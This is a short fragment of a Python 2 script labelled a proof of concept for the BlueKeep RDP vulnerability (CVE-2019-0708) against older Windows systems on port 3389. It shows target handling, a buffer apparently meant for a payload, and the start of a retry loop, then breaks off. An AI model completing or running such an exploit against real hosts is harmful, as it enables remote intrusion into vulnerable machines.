# RDP CVE-2019-0708 BlueKeep PoC | idea by k8gege & SherlockSec
# Local:  Linux Debian  (python)
# Target: WinXP | XP Embedded | Win7 | Server 2003 | Server 2008  (open 3389)
...
HOST = sys.argv[1]
PORT = 3389
print "WinXP | XP Embedded | Win7 | Server 2003 | Server 2008 | CVE-2019-0708 PoC "
print "Target: "+HOST
recexec=buf
for i in range(8):
	try:
